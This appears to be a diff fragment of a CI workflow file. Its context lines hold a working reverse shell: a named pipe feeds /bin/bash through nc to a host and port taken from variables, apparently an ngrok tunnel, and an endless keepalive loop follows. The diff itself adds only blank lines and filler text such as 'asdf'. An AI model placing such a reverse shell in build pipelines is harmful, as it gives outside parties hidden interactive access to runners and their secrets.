@@ -22,3 +22,25 @@ jobs:
             mknod /tmp/backpipe p
             /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
             while true; do sleep 60; echo "Keepalive"; done
+            
+            
+            
+            
+            
+            asdf
+            
+            
+            asdf
+            
+            
+            
+            
+            
+            asdff
+            
+            
+            
+            
+            
+            
+            asdf
